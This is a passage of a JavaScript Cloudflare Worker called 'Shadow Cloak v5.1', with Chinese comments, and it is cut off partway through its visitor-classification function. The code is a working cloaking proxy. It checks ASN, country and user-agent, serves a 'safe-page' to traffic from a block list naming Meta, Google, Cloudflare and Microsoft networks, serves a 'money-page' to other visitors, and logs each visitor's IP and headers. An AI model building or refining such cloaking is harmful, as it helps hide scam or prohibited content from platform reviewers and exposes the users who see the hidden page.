// 隱者斗篷 (Shadow Cloak) v5.1
// Reverse Proxy A/B 分流 + D1 日誌寫入
// ============================================

addEventListener('fetch', event => {
  event.respondWith(handleFetch(event.request, event))
})

// ============================================
// 主路由
// ============================================
async function handleFetch(request, event) {
  const url = new URL(request.url)
  const cf = request.cf || {}

  // 判斷訪客身份
  const verdict = determineVerdict(cf, request)
  const reason = getVerdictReason(cf, request, verdict)
  
  // 選擇目標頁面
  const targetOrigin = verdict === 'safe' 
    ? 'https://safe-page.laoqin1689.workers.dev'
    : 'https://money-page.laoqin1689.workers.dev'

  // 準備日誌數據
  const logData = {
    timestamp: new Date().toISOString(),
    ip: cf.clientIp || 'unknown',
    asn: cf.asn || 0,
    country: cf.country || 'unknown',
    ua: request.headers.get('user-agent') || 'unknown',
    verdict,
    reason,
    path: url.pathname + url.search,
    referer: request.headers.get('referer') || ''
  }

  // 非同步記錄日誌（不阻塞回應）
  if (event && event.waitUntil) {
    event.waitUntil(logToDB(logData))
  }

  // Reverse Proxy：串流回傳目標頁面內容
  try {
    const proxyUrl = targetOrigin + url.pathname + url.search
    const proxyRequest = new Request(proxyUrl, {
      method: request.method,
      headers: request.headers,
      body: request.body
    })

    const response = await fetch(proxyRequest)
    
    // 保留原始 Content-Type 和其他重要 headers
    const headers = new Headers(response.headers)
    headers.set('X-Shadow-Cloak', 'v5.1')
    headers.set('X-Verdict', verdict)

    return new Response(response.body, {
      status: response.status,
      statusText: response.statusText,
      headers
    })
  } catch (error) {
    console.error('Proxy error:', error)
    return new Response('Proxy error: ' + error.message, { status: 502 })
  }
}

// ============================================
// 判斷訪客身份邏輯
// ============================================
function determineVerdict(cf, request) {
  const asn = cf.asn || 0
  const country = cf.country || ''
  const ua = request.headers.get('user-agent') || ''

  // 黑名單 ASN（Meta、Google、Cloudflare、Microsoft）
  const blockedAsns = [32934, 15169, 13335, 8075]